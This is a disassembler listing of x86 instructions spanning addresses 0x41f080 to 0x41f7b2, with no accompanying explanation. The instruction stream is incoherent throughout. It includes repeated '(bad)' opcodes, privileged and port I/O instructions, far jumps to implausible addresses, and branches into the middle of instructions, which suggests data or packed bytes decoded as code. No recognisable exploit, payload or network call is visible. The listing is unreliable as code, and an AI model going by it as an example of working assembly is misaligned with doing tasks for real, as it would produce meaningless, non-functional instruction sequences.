  41f080:	mov    esp,DWORD PTR [ebp+0x2783369a]
  41f086:	mov    dh,0x44
  41f088:	call   0x3026db
  41f08d:	inc    edx
  41f08e:	shl    BYTE PTR [ecx],cl
  41f090:	and    al,0x35
  41f092:	outs   dx,BYTE PTR ds:[esi]
  41f093:	sbb    al,BYTE PTR [eax+edx*4-0x6ffff039]
  41f09a:	push   esp
  41f09b:	(bad)  
  41f09c:	and    edi,DWORD PTR [eax+0x42]
  41f09f:	out    0x23,al
  41f0a1:	push   0xc0c50dc
  41f0a6:	xlat   BYTE PTR ds:[ebx]
  41f0a7:	lldt   WORD PTR [eax+0x48a5208]
  41f0ae:	mov    eax,0x20f6a92f
  41f0b3:	mov    ecx,0x2eb7ccc5
  41f0b8:	push   DWORD PTR [edi+0x7d]
  41f0bb:	jmp    WORD PTR [edi+0x41]
  41f0bf:	jp     0x41f0f1
  41f0c1:	cmp    eax,DWORD PTR [ebx-0x22]
  41f0c4:	and    edi,DWORD PTR [esi+edx*2+0x5f]
  41f0c8:	or     al,0x0
  41f0ca:	add    BYTE PTR [eax],al
  41f0cc:	add    BYTE PTR [eax],al
  41f0ce:	adc    al,0xba
  41f0d0:	adc    eax,DWORD PTR [eax]
  41f0d2:	nop
  41f0d3:	and    DWORD PTR [eax],edx
  41f0d5:	mov    DWORD PTR [ebp+0x7],eax
  41f0d8:	xchg   ecx,eax
  41f0d9:	jge    0x41f0ab
  41f0db:	ret    
  41f0dc:	sbb    al,0x84
  41f0de:	das    
  41f0df:	fcom   QWORD PTR [ecx]
  41f0e1:	add    BYTE PTR [ecx],dl
  41f0e3:	rol    BYTE PTR cs:[eax+0xd11db90],cl
  41f0ea:	or     al,0xca
  41f0ec:	adc    DWORD PTR [eax],eax
  41f0ee:	nop
  41f0ef:	pop    eax
  41f0f0:	in     al,dx
  41f0f1:	inc    ebx
  41f0f2:	xchg   ecx,eax
  41f0f3:	mov    esp,0xdb90e796
  41f0f8:	adc    eax,ebp
  41f0fa:	call   0xad3e5eb3
  41f0ff:	iret   
  41f100:	fild   WORD PTR [esi]
  41f102:	fist   WORD PTR [ebp-0x246e7fd6]
  41f108:	adc    ecx,ebp
  41f10a:	mov    dl,al
  41f10c:	retf   
  41f10d:	add    eax,DWORD PTR [ebp-0x2e]
  41f110:	sub    bl,BYTE PTR [esi+0x58]
  41f113:	mov    dl,0xe4
  41f115:	xchg   edi,edx
  41f117:	mov    dl,0xf7
  41f119:	add    eax,DWORD PTR [ecx+0x360611f2]
  41f11f:	cmp    esi,DWORD PTR [eax+ebp*1]
  41f122:	push   0x73ff626b
  41f127:	jl     0x41f191
  41f129:	stos   BYTE PTR es:[edi],al
  41f12a:	jmp    0x7955d768
  41f12f:	imul   esi,DWORD PTR [eax-0x32],0x0
  41f133:	add    BYTE PTR [eax],al
  41f135:	add    BYTE PTR [eax],al
  41f137:	fwait
  41f138:	das    
  41f139:	pop    ds
  41f13a:	test   esp,0xa013cd31
  41f140:	aas    
  41f141:	loop   0x41f128
  41f143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f144:	fwait
  41f145:	ret    0x1a1b
  41f148:	outs   dx,BYTE PTR ds:[esi]
  41f149:	sbb    edi,DWORD PTR ds:0x3d136e5e
  41f14f:	or     al,0xf2
  41f151:	stos   BYTE PTR es:[edi],al
  41f152:	cmp    ebx,DWORD PTR [ebx]
  41f154:	jae    0x41f149
  41f156:	jmp    0xc7a453ee
  41f15b:	jae    0x41f1ce
  41f15d:	add    BYTE PTR [ecx],ah
  41f15f:	adc    DWORD PTR [ebp-0x19],eax
  41f162:	pop    ds
  41f163:	mov    ds:0x5e82958c,eax
  41f168:	popf   
  41f169:	push   0x23
  41f16b:	or     ch,BYTE PTR [esi-0x2d]
  41f16e:	cmp    DWORD PTR [esi],edx
  41f170:	outs   dx,BYTE PTR ds:[esi]
  41f171:	fstp   TBYTE PTR [ecx]
  41f173:	adc    al,0xf2
  41f175:	bound  edx,QWORD PTR [edi]
  41f177:	sbb    esi,DWORD PTR [ebx-0x21]
  41f17a:	jmp    0xc8bc540e
  41f17f:	mov    bl,0x6d
  41f181:	daa    
  41f182:	jge    0x41f106
  41f184:	in     ax,0xc3
  41f187:	out    0x2f,eax
  41f189:	mov    esp,0xdf450910
  41f18e:	xchg   ah,dl
  41f190:	ds push cs
  41f192:	mov    dl,BYTE PTR [ebx]
  41f194:	inc    edi
  41f195:	dec    esi
  41f196:	scas   al,BYTE PTR es:[edi]
  41f197:	mov    WORD PTR [edx+0xf0e],?
  41f19d:	add    BYTE PTR [eax],al
  41f19f:	add    BYTE PTR [ecx],cl
  41f1a1:	outs   dx,DWORD PTR ds:[esi]
  41f1a2:	es pop es
  41f1a4:	or     esi,DWORD PTR [ecx+0x32]
  41f1a7:	frstor [ebp+0x782d96ae]
  41f1ad:	jl     0x41f1a8
  41f1af:	out    dx,al
  41f1b0:	or     DWORD PTR [edi+0x4e],ebp
  41f1b3:	jno    0x41f17d
  41f1b5:	nop
  41f1b6:	and    al,0x36
  41f1b8:	or     eax,0xcae90ec7
  41f1bd:	inc    esp
  41f1be:	sub    bl,bh
  41f1c0:	xchg   esp,eax
  41f1c1:	dec    esp
  41f1c2:	xchg   edi,eax
  41f1c3:	(bad)  [edi+0x75e0f97d]
  41f1c9:	cmp    edx,DWORD PTR [ebp+0xd]
  41f1cc:	outs   dx,BYTE PTR ds:[esi]
  41f1cd:	sub    eax,0x58a50d53
  41f1d2:	or     DWORD PTR [eax+ecx*2-0x70],ebp
  41f1d6:	es cdq 
  41f1d8:	int3   
  41f1d9:	aas    
  41f1da:	xor    bh,cl
  41f1dc:	push   ss
  41f1dd:	js     0x41f211
  41f1df:	fldcw  WORD PTR [ebx-0x6c166b3b]
  41f1e5:	das    
  41f1e6:	iret   
  41f1e7:	popf   
  41f1e8:	xchg   edi,eax
  41f1e9:	les    edx,FWORD PTR [edx-0x3b]
  41f1ec:	jb     0x41f227
  41f1ee:	gs icebp 
  41f1f0:	push   ss
  41f1f1:	mov    esi,0xc5a0641d
  41f1f6:	in     eax,dx
  41f1f7:	neg    BYTE PTR [eax]
  41f1f9:	js     0x41f22d
  41f1fb:	aad    0x7b
  41f1fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1fe:	stos   BYTE PTR es:[edi],al
  41f1ff:	jmp    0xd1520597
  41f204:	add    BYTE PTR [eax],al
  41f206:	add    BYTE PTR [eax],al
  41f208:	add    BYTE PTR [edi],dh
  41f20a:	ret    0xe90e
  41f20d:	sbb    ah,dl
  41f20f:	xchg   ebx,eax
  41f210:	xlat   BYTE PTR ds:[ebx]
  41f211:	fild   WORD PTR [esi-0x773dff67]
  41f217:	or     al,0x7e
  41f219:	(bad)  [esp+ebp*2]
  41f21c:	add    al,0x3a
  41f21e:	(bad)  
  41f21f:	adc    DWORD PTR [eax],edx
  41f221:	jl     0x41f1b2
  41f223:	xchg   edi,eax
  41f224:	pop    es
  41f225:	sub    al,0x6f
  41f227:	popa   
  41f228:	sbb    esp,DWORD PTR [ebx-0x423f7046]
  41f22e:	fucomip st,st(2)
  41f230:	je     0x41f1ff
  41f232:	jg     0x41f1cd
  41f234:	dec    esp
  41f235:	int    0x7f
  41f237:	imul   BYTE PTR [ebp-0x7af150d1]
  41f23d:	cmp    DWORD PTR [ebx-0x655201ef],edi
  41f243:	xor    BYTE PTR [ebp-0x16],al
  41f246:	outs   dx,BYTE PTR ds:[esi]
  41f247:	adc    eax,0xddb2873b
  41f24c:	mov    esi,DWORD PTR [edi+0x79bbc057]
  41f252:	scas   eax,DWORD PTR es:[edi]
  41f253:	js     0x41f257
  41f255:	xor    DWORD PTR [ecx],edi
  41f257:	(bad)  
  41f258:	call   0x2f33a1
  41f25d:	mov    dl,0x3f
  41f25f:	nop
  41f260:	idiv   ch
  41f262:	test   DWORD PTR [edi+0x6ca530eb],edx
  41f268:	xor    ah,BYTE PTR [ebp+eax*8+0x8311]
  41f26f:	add    BYTE PTR [eax],al
  41f271:	add    BYTE PTR [esi],al
  41f273:	stos   DWORD PTR es:[edi],eax
  41f274:	or     dh,BYTE PTR [ebp+0x58]
  41f277:	cmp    dl,BYTE PTR [ebx]
  41f279:	test   DWORD PTR [ecx-0x45],ebp
  41f27c:	push   es
  41f27d:	push   0x39
  41f27f:	xor    ch,BYTE PTR [esi+0x61462908]
  41f285:	and    al,0x49
  41f287:	xor    al,0x5a
  41f289:	and    al,0x99
  41f28b:	push   esi
  41f28c:	dec    ebx
  41f28d:	xchg   cl,ch
  41f28f:	scas   al,BYTE PTR es:[edi]
  41f290:	xchg   ecx,eax
  41f291:	rcl    BYTE PTR [eax+0x4cfe0e65],0xad
  41f298:	xor    eax,0x1b141343
  41f29d:	cmp    DWORD PTR [esi-0x2177bc7b],esp
  41f2a3:	lock nop
  41f2a5:	mov    eax,0x7fbd990
  41f2aa:	or     eax,0x60202e95
  41f2af:	mov    BYTE PTR [edi-0x65168bb5],dl
  41f2b5:	pop    ebx
  41f2b6:	ins    BYTE PTR es:[edi],dx
  41f2b7:	bnd jns 0x41f2eb
  41f2ba:	push   ss
  41f2bb:	fst    DWORD PTR [ecx]
  41f2bd:	mov    DWORD PTR [ebp+ebp*8+0x9],eax
  41f2c1:	mov    esp,edx
  41f2c3:	out    dx,eax
  41f2c4:	cmp    DWORD PTR [ecx-0x78f20804],ecx
  41f2ca:	xchg   ecx,eax
  41f2cb:	fs adc al,0x31
  41f2ce:	jle    0x41f315
  41f2d0:	pop    ebp
  41f2d1:	out    0xc8,eax
  41f2d3:	and    al,0x13
  41f2d5:	add    BYTE PTR [eax],al
  41f2d7:	add    BYTE PTR [eax],al
  41f2d9:	add    BYTE PTR [eax],al
  41f2db:	sbb    ebx,DWORD PTR [edx+0x14bd5dc9]
  41f2e1:	popf   
  41f2e2:	loop   0x41f299
  41f2e4:	mov    WORD PTR [edi+0x764d3c88],?
  41f2ea:	jae    0x41f2cf
  41f2ec:	sub    ecx,eax
  41f2ee:	imul   esp,DWORD PTR [eax-0x6f9694bc],0xb0126908
  41f2f8:	rcl    ecx,0xff
  41f2fb:	adc    bl,BYTE PTR [eax+0x63d58b16]
  41f301:	ret    0x8fc5
  41f304:	retf   0x4250
  41f307:	cmp    BYTE PTR [edx+edx*1],cl
  41f30a:	add    BYTE PTR [eax-0x5ebc0130],dl
  41f310:	mov    dl,0x37
  41f312:	add    al,0x13
  41f314:	repz inc ebx
  41f316:	daa    
  41f317:	sbb    DWORD PTR [eax-0x79],esi
  41f31a:	mov    ss,WORD PTR [edx+0x6]
  41f31d:	int    0xa7
  41f31f:	push   ds
  41f320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f321:	mov    dh,0x6b
  41f323:	xor    DWORD PTR [edi],0xffffffb8
  41f326:	lock cdq 
  41f328:	xor    eax,0xb73c7a9f
  41f32d:	outs   dx,BYTE PTR ds:[esi]
  41f32e:	rol    bl,0xcd
  41f331:	cli    
  41f332:	ss iret 
  41f334:	xchg   ebx,eax
  41f335:	cmp    dh,BYTE PTR [eax+0x16]
  41f338:	jb     0x41f330
  41f33a:	mov    BYTE PTR [edx-0x16],dl
  41f33d:	daa    
  41f33e:	jnp    0x41f340
  41f340:	add    BYTE PTR [eax],al
  41f342:	add    BYTE PTR [eax],al
  41f344:	cmp    BYTE PTR [esi+0x2c97c3c9],0x33
  41f34b:	pop    eax
  41f34c:	shl    ah,0xf4
  41f34f:	mov    dl,0x4f
  41f351:	jg     0x41f3cf
  41f353:	jp     0x41f3d4
  41f355:	shl    esp,0xc2
  41f358:	dec    ecx
  41f359:	pop    eax
  41f35a:	pop    esi
  41f35b:	retf   0x2f92
  41f35e:	stos   DWORD PTR es:[edi],eax
  41f35f:	xchg   ebx,eax
  41f360:	push   ds
  41f361:	out    dx,al
  41f362:	test   DWORD PTR [ebx],0x61a6ca90
  41f368:	push   edi
  41f369:	sar    DWORD PTR [edx-0x30],0x3f
  41f36d:	sti    
  41f36e:	xor    al,BYTE PTR [ebx]
  41f370:	nop
  41f371:	mov    dl,0x4f
  41f373:	fbstp  TBYTE PTR ds:0xd288f7b2
  41f379:	ret    0xd07a
  41f37c:	pop    ds
  41f37d:	bound  ecx,QWORD PTR [edi]
  41f37f:	sub    al,0x7b
  41f381:	mov    bl,0xf7
  41f383:	mov    fs,WORD PTR [edx+0x6a]
  41f386:	retf   
  41f387:	ret    
  41f388:	pop    ss
  41f389:	dec    ebx
  41f38a:	xchg   DWORD PTR [esp+edx*2+0x60f60eb9],ecx
  41f391:	cmp    DWORD PTR [esi-0x1e],edx
  41f394:	in     eax,dx
  41f395:	outs   dx,BYTE PTR ds:[esi]
  41f396:	in     eax,dx
  41f397:	mov    edi,0x2e78e905
  41f39c:	imul   esp,edi,0xfb69229b
  41f3a2:	jmp    0x41f372
  41f3a4:	xchg   esp,eax
  41f3a5:	mov    dl,0x29
  41f3a7:	mov    bl,0x0
  41f3a9:	add    BYTE PTR [eax],al
  41f3ab:	add    BYTE PTR [eax],al
  41f3ad:	loope  0x41f35c
  41f3af:	fwait
  41f3b0:	xor    DWORD PTR [ecx+0x7a],ecx
  41f3b3:	fdivr  DWORD PTR [esi]
  41f3b5:	xchg   esp,eax
  41f3b6:	pop    eax
  41f3b7:	xchg   edi,eax
  41f3b8:	push   cs
  41f3b9:	mov    BYTE PTR [eax-0x69],bl
  41f3bc:	mov    bl,BYTE PTR cs:[edi+0x4c]
  41f3c0:	inc    edx
  41f3c1:	pop    ebx
  41f3c2:	repnz inc ebx
  41f3c4:	bound  edi,QWORD PTR [eax]
  41f3c6:	xor    dh,bl
  41f3c8:	xchg   ecx,eax
  41f3c9:	adc    ecx,ebp
  41f3cb:	push   ds
  41f3cc:	call   0xba83a664
  41f3d1:	in     al,dx
  41f3d2:	fs inc esp
  41f3d4:	pusha  
  41f3d5:	pop    eax
  41f3d6:	xchg   esp,eax
  41f3d7:	jb     0x41f3ef
  41f3d9:	pop    ss
  41f3da:	ins    BYTE PTR es:[edi],dx
  41f3db:	xor    bh,BYTE PTR [ebp-0x42683cfc]
  41f3e1:	pop    DWORD PTR [edx-0x79784a69]
  41f3e7:	xchg   edi,eax
  41f3e8:	lods   eax,DWORD PTR ds:[esi]
  41f3e9:	jg     0x41f465
  41f3eb:	xchg   edi,eax
  41f3ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3ed:	ja     0x41f46d
  41f3ef:	xchg   edi,eax
  41f3f0:	popf   
  41f3f1:	scas   eax,DWORD PTR es:[edi]
  41f3f2:	jb     0x41f38b
  41f3f4:	xchg   ebp,eax
  41f3f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3f6:	jbe    0x41f38f
  41f3f8:	lea    ebx,[edi-0x683a6896]
  41f3fe:	outs   dx,BYTE PTR ds:[esi]
  41f3ff:	xchg   edi,eax
  41f400:	mov    ebp,0x67f6628f
  41f405:	das    
  41f406:	mov    edi,0x94005ced
  41f40b:	xchg   edx,eax
  41f40c:	add    BYTE PTR [ecx],ch
  41f40e:	mov    ah,0xe
  41f410:	mov    ecx,0x0
  41f415:	add    BYTE PTR [edi-0x49fff14a],bh
  41f41b:	repnz xor DWORD PTR [ebp+eax*4+0x2d],edx
  41f420:	add    BYTE PTR cs:[eax+0x605c31e7],al
  41f427:	out    0x31,eax
  41f429:	pusha  
  41f42a:	sar    ebx,1
  41f42c:	lock add cl,ch
  41f42f:	cmp    BYTE PTR [edx+0xeb3fd24],al
  41f435:	add    BYTE PTR [eax],dl
  41f437:	imul   ebp,ebp,0xffffffff
  41f43a:	mov    ecx,0xa9e5b24b
  41f43f:	mov    bl,0x99
  41f441:	test   ch,al
  41f443:	pop    ss
  41f444:	out    dx,al
  41f445:	(bad)  
  41f446:	mov    ecx,0xd54c98e3
  41f44b:	fcomi  st,st(5)
  41f44d:	mov    esp,0x83ea3b16
  41f452:	fdivr  QWORD PTR [edx]
  41f454:	xchg   ecx,eax
  41f455:	rol    BYTE PTR [esp+ebx*4+0x3f558499],0xed
  41f45d:	jmp    FWORD PTR [ecx-0x1d]
  41f460:	cwde   
  41f461:	dec    esp
  41f462:	test   esi,ebx
  41f464:	cmc    
  41f465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f466:	(bad)  
  41f467:	cmp    ch,dl
  41f469:	test   BYTE PTR [ecx+0x683992aa],bh
  41f46f:	mov    bl,0xe
  41f471:	mov    edi,DWORD PTR ds:0xf58d6e9f
  41f477:	sahf   
  41f478:	push   ds
  41f479:	mov    DWORD PTR [eax],eax
  41f47b:	add    BYTE PTR [eax],al
  41f47d:	add    BYTE PTR [eax],al
  41f47f:	cmc    
  41f480:	sahf   
  41f481:	or     cl,BYTE PTR [ebp-0x76d5610b]
  41f487:	in     eax,0x9e
  41f489:	cs (bad) 
  41f48b:	cmc    
  41f48c:	sahf   
  41f48d:	push   esi
  41f48e:	mov    DWORD PTR [eax+0xd240e0d],edx
  41f494:	adc    eax,0xd091c0e
  41f499:	push   cs
  41f49a:	sbb    BYTE PTR [esi-0x5b],cl
  41f49d:	fwait
  41f49e:	aas    
  41f49f:	nop
  41f4a0:	nop
  41f4a1:	lods   eax,DWORD PTR ds:[esi]
  41f4a2:	and    ebp,DWORD PTR [esp+ecx*8+0x6f900011]
  41f4a9:	cdq    
  41f4aa:	or     eax,0xd82e451d
  41f4af:	nop
  41f4b0:	leave  
  41f4b1:	adc    eax,ebp
  41f4b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4b4:	not    BYTE PTR [edx]
  41f4b6:	add    BYTE PTR ds:0x3812dfe6,cl
  41f4bc:	ins    DWORD PTR es:[edi],dx
  41f4bd:	cwde   
  41f4be:	aas    
  41f4bf:	nop
  41f4c0:	or     BYTE PTR [eax],al
  41f4c2:	dec    esp
  41f4c3:	mov    ds:0xa8891289,eax
  41f4c8:	dec    ebp
  41f4c9:	ja     0x41f4d7
  41f4cb:	adc    al,0x16
  41f4cd:	adc    eax,DWORD PTR [eax]
  41f4cf:	nop
  41f4d0:	push   esi
  41f4d1:	mov    fs,WORD PTR [ebx]
  41f4d3:	mov    eax,0x400011c8
  41f4d8:	inc    edx
  41f4d9:	(bad)  
  41f4da:	and    ebp,DWORD PTR [eax-0x5cb400c4]
  41f4e0:	mov    edx,DWORD PTR [edx]
  41f4e2:	mov    DWORD PTR [eax],eax
  41f4e4:	add    BYTE PTR [eax],al
  41f4e6:	add    BYTE PTR [eax],al
  41f4e8:	js     0x41f541
  41f4ea:	gs jae 0x41f4a0
  41f4ed:	inc    eax
  41f4ee:	into   
  41f4ef:	and    ecx,esp
  41f4f1:	dec    esi
  41f4f2:	mov    esi,0x1a507c23
  41f4f7:	push   edx
  41f4f8:	ret    
  41f4f9:	icebp  
  41f4fa:	and    DWORD PTR [ebp-0x43],edx
  41f4fd:	sbb    esp,DWORD PTR [ebp+0x4e]
  41f500:	loopne 0x41f542
  41f502:	(bad)  
  41f503:	and    ebx,DWORD PTR [eax+edi*4-0x22af7dc1]
  41f50a:	into   
  41f50b:	leave  
  41f50c:	or     DWORD PTR [ebx+0x65841fa3],esi
  41f512:	or     al,0x11
  41f514:	mov    esp,0x903b7a1
  41f519:	aas    
  41f51a:	ror    DWORD PTR [edi],cl
  41f51c:	adc    edi,DWORD PTR [esi-0x49e70595]
  41f522:	jp     0x41f4ec
  41f524:	mov    bl,0x4e
  41f526:	xchg   BYTE PTR [eax-0x2b5469b5],cl
  41f52c:	imul   esi,DWORD PTR [ebx-0x4d4aebc1],0x62e4cef7
  41f536:	out    0x80,eax
  41f538:	pop    ds
  41f539:	dec    eax
  41f53a:	and    DWORD PTR [ebx+0x543965b],eax
  41f540:	inc    ebx
  41f541:	popa   
  41f542:	pusha  
  41f543:	mov    edi,0x8b088a73
  41f548:	xchg   edi,eax
  41f549:	popa   
  41f54a:	dec    edx
  41f54b:	iret   
  41f54c:	add    BYTE PTR [eax],al
  41f54e:	add    BYTE PTR [eax],al
  41f550:	add    BYTE PTR [ebx+0x3a],dh
  41f553:	sub    ebx,edx
  41f555:	aaa    
  41f556:	(bad)  
  41f557:	popa   
  41f558:	ret    
  41f559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f55a:	ins    DWORD PTR es:[edi],dx
  41f55b:	test   ah,dl
  41f55d:	(bad)  
  41f55e:	aaa    
  41f55f:	mov    eax,0x785465f0
  41f564:	div    DWORD PTR [ebx-0x570f20be]
  41f56a:	sub    DWORD PTR [eax+eiz*1],esi
  41f56d:	clc    
  41f56e:	aaa    
  41f56f:	scas   eax,DWORD PTR es:[edi]
  41f570:	out    dx,eax
  41f571:	mov    al,ds:0xe41d2e54
  41f576:	lods   al,BYTE PTR ds:[esi]
  41f577:	pusha  
  41f578:	mov    edi,0x49789ab3
  41f57d:	pop    esp
  41f57e:	mov    ebp,0xcaa56c07
  41f583:	push   ebp
  41f584:	jbe    0x41f5a0
  41f586:	jbe    0x41f59b
  41f588:	hlt    
  41f589:	xlat   BYTE PTR ds:[ebx]
  41f58a:	mov    ebp,0xa263dc0e
  41f58f:	dec    esi
  41f590:	jmp    0xd174669f
  41f595:	inc    ebx
  41f596:	sub    dl,BYTE PTR [edi]
  41f598:	push   ds
  41f599:	cmp    al,0xb5
  41f59b:	cdq    
  41f59c:	out    dx,al
  41f59d:	dec    esi
  41f59e:	mov    esi,0x7112e13e
  41f5a3:	xor    ah,cl
  41f5a5:	rdmsr  
  41f5a7:	aad    0xeb
  41f5a9:	jle    0x41f614
  41f5ab:	xor    al,ch
  41f5ad:	xchg   esi,eax
  41f5ae:	xor    DWORD PTR [eax],edx
  41f5b0:	out    dx,al
  41f5b1:	jge    0x41f571
  41f5b3:	xchg   edi,eax
  41f5b4:	push   ebp
  41f5b5:	add    BYTE PTR [eax],al
  41f5b7:	add    BYTE PTR [eax],al
  41f5b9:	add    BYTE PTR [eax+0x11da9952],dh
  41f5bf:	call   0x910a5ab1
  41f5c4:	inc    edx
  41f5c5:	shr    DWORD PTR [ebp+0x17c6edd4],0x69
  41f5cc:	xor    bl,ch
  41f5ce:	cmp    ebx,ebp
  41f5d0:	jns    0x41f588
  41f5d2:	inc    ebp
  41f5d3:	sub    BYTE PTR [ebx+0x5],bl
  41f5d6:	cwde   
  41f5d7:	not    DWORD PTR [edx-0x33]
  41f5da:	xchg   DWORD PTR [edx],ecx
  41f5dc:	mov    ch,0x29
  41f5de:	mov    WORD PTR ds:0xca7fcd4b,?
  41f5e4:	pop    ecx
  41f5e5:	xchg   bx,ax
  41f5e7:	mov    dl,0x92
  41f5e9:	test   eax,0x25999780
  41f5ee:	mov    al,0x96
  41f5f0:	fwait
  41f5f1:	sbb    eax,0xe199a6b0
  41f5f6:	popa   
  41f5f7:	ins    BYTE PTR es:[edi],dx
  41f5f8:	in     eax,dx
  41f5f9:	mov    eax,0xd4cf2fb3
  41f5fe:	cdq    
  41f5ff:	push   esp
  41f600:	daa    
  41f601:	lds    edi,FWORD PTR [edi-0x5a]
  41f604:	sbb    eax,0x10cacc75
  41f609:	add    bl,al
  41f60b:	jno    0x41f59e
  41f60d:	shl    BYTE PTR [ebx-0x4f],0x46
  41f611:	paddsb mm7,QWORD PTR [edi]
  41f614:	cwde   
  41f615:	dec    esp
  41f616:	lea    ebx,[edx-0x50400a0a]
  41f61c:	push   cs
  41f61d:	mov    eax,DWORD PTR [eax]
  41f61f:	add    BYTE PTR [eax],al
  41f621:	add    BYTE PTR [eax],al
  41f623:	cmc    
  41f624:	fwait
  41f625:	push   edx
  41f626:	mov    edx,DWORD PTR ds:0xf503269c
  41f62c:	fwait
  41f62d:	cmp    DWORD PTR ds:[esi+ebp*4-0x238216f1],0xffffff96
  41f636:	int    0x91
  41f638:	cmp    ah,BYTE PTR [edx-0x39d51700]
  41f63e:	test   edx,edx
  41f640:	retf   
  41f641:	inc    ebp
  41f642:	xor    edi,DWORD PTR [ecx]
  41f644:	lock xchg ebp,eax
  41f646:	add    esi,DWORD PTR [eax-0x3e]
  41f649:	in     al,dx
  41f64a:	mov    DWORD PTR [ebp-0x6e],esi
  41f64d:	es mov ecx,esp
  41f650:	jecxz  0x41f655
  41f652:	inc    eax
  41f653:	mov    ecx,0x33055727
  41f658:	sti    
  41f659:	xor    DWORD PTR [ecx+esi*1-0xe],eax
  41f65d:	adc    ecx,DWORD PTR [edx-0x77c16d83]
  41f663:	jp     0x41f622
  41f665:	sbb    dh,BYTE PTR [esi+0x74eadfe8]
  41f66b:	int    0x8b
  41f66d:	cdq    
  41f66e:	jnp    0x41f5f1
  41f670:	out    dx,al
  41f671:	jmp    0x6a05:0x4f0d76d6
  41f678:	aaa    
  41f679:	sbb    dh,BYTE PTR [esi-0xa24356]
  41f67f:	dec    ebp
  41f680:	fwait
  41f681:	pop    edx
  41f682:	push   edi
  41f683:	(bad)  
  41f684:	ins    DWORD PTR es:[edi],dx
  41f685:	sbb    dh,BYTE PTR [esi+0x0]
  41f68b:	add    BYTE PTR [eax-0x78b014f8],dl
  41f691:	and    ecx,edi
  41f693:	add    eax,0x640dfd4f
  41f698:	xchg   ebx,eax
  41f699:	xchg   esp,eax
  41f69a:	sar    esp,0x66
  41f69d:	dec    eax
  41f69e:	sub    eax,0xe1d0523
  41f6a3:	xor    BYTE PTR [eax],bh
  41f6a5:	(bad)  
  41f6a6:	dec    edx
  41f6a7:	std    
  41f6a8:	daa    
  41f6a9:	dec    esi
  41f6aa:	aad    0x23
  41f6ac:	pop    esp
  41f6ad:	mov    cl,0x68
  41f6af:	in     eax,0x16
  41f6b1:	lods   al,BYTE PTR ds:[esi]
  41f6b2:	xchg   esp,eax
  41f6b3:	dec    ebx
  41f6b4:	mov    ah,0x1
  41f6b6:	jp     0x41f6a7
  41f6b8:	out    dx,al
  41f6b9:	mov    edx,0xed548861
  41f6be:	stc    
  41f6bf:	pop    esp
  41f6c0:	or     ecx,esi
  41f6c2:	xchg   esi,eax
  41f6c3:	ror    BYTE PTR [esi+0x76],0xdd
  41f6c7:	mov    ch,ch
  41f6c9:	jge    0x41f720
  41f6cb:	mov    BYTE PTR [ebp+ebp*4-0x16],cl
  41f6cf:	or     al,0x27
  41f6d1:	popf   
  41f6d2:	ss or  al,0xb9
  41f6d5:	jo     0x41f680
  41f6d7:	inc    edi
  41f6d9:	aas    
  41f6da:	into   
  41f6db:	and    ecx,DWORD PTR [eax-0x6f4b670e]
  41f6e1:	leave  
  41f6e2:	pop    eax
  41f6e3:	add    bh,BYTE PTR [eax]
  41f6e5:	mov    al,ds:0xf985ffd6
  41f6ea:	sar    edi,cl
  41f6ec:	(bad)  
  41f6ed:	int    0xcd
  41f6ef:	push   0x0
  41f6f4:	add    BYTE PTR [ecx+ecx*8+0xd],cl
  41f6f8:	rcl    cl,1
  41f6fa:	retf   
  41f6fb:	mov    eax,ds:0x1ea652fe
  41f700:	push   0xffffff88
  41f702:	inc    eax
  41f703:	daa    
  41f704:	sub    BYTE PTR [ebx],dl
  41f706:	nop
  41f707:	adc    bh,ch
  41f709:	test   DWORD PTR [edx-0x4d2fea11],esi
  41f70f:	jb     0x41f755
  41f711:	jecxz  0x41f6b7
  41f713:	js     0x41f6f9
  41f715:	scas   eax,DWORD PTR es:[edi]
  41f716:	mov    dl,0x34
  41f718:	les    ebp,FWORD PTR [edi+0x47c50798]
  41f71e:	icebp  
  41f71f:	mov    bh,0x27
  41f721:	ins    BYTE PTR es:[edi],dx
  41f722:	loop   0x41f6da
  41f724:	add    edx,DWORD PTR [ecx+0x61]
  41f727:	jo     0x41f79e
  41f729:	adc    BYTE PTR [ecx-0x9],bh
  41f72c:	imul   DWORD PTR [ebp+ebp*1-0x4a]
  41f730:	pop    es
  41f731:	enter  0xf33e,0xbb
  41f735:	mov    ds:0xf83a1ca2,al
  41f73a:	jg     0x41f722
  41f73c:	add    al,0x90
  41f73e:	int    0xf4
  41f740:	jb     0x41f707
  41f742:	retf   0xb163
  41f745:	idiv   BYTE PTR [ecx-0x6d07fd90]
  41f74b:	mov    WORD PTR [ebx],es
  41f74d:	nop
  41f74e:	xor    eax,0x51110416
  41f753:	sti    
  41f754:	add    esi,DWORD PTR [esi]
  41f756:	cmc    
  41f757:	and    al,0x7f
  41f759:	add    BYTE PTR [eax],al
  41f75b:	add    BYTE PTR [eax],al
  41f75d:	add    dh,al
  41f75f:	xor    eax,0xae3c0415
  41f764:	jmp    0xda29fac
  41f769:	pop    esp
  41f76a:	sbb    eax,0x1872bcba
  41f76f:	ret    
  41f770:	jp     0x41f7eb
  41f772:	and    esi,DWORD PTR [ecx-0x7b]
  41f775:	(bad)  
  41f776:	jae    0x41f71a
  41f778:	stc    
  41f779:	fld    QWORD PTR [edx+ebx*2-0x5618ecef]
  41f780:	cmp    al,BYTE PTR [ebp+0x7d]
  41f783:	outs   dx,BYTE PTR ds:[esi]
  41f784:	rcl    DWORD PTR [ebx],cl
  41f786:	jg     0x41f7cd
  41f788:	push   cs
  41f789:	jmp    0x41f785
  41f78b:	loope  0x41f805
  41f78d:	mov    cl,0x4b
  41f78f:	fstp   QWORD PTR [ecx+ebp*4-0x6d]
  41f793:	dec    esp
  41f794:	push   cs
  41f795:	rcr    DWORD PTR [ecx+ebp*2+0x78],cl
  41f799:	loope  0x41f77d
  41f79b:	inc    ebp
  41f79c:	xor    al,BYTE PTR ds:0x1e23d16a
  41f7a2:	mov    WORD PTR [edx-0x53c7d66d],?
  41f7a8:	xchg   edi,eax
  41f7a9:	dec    dl
  41f7ab:	outs   dx,BYTE PTR ds:[esi]
  41f7ac:	adc    ch,al
  41f7ae:	xchg   ebx,eax
  41f7af:	mov    dl,0xe
  41f7b1:	pop    ecx
  41f7b2:	mov    ebx,cs
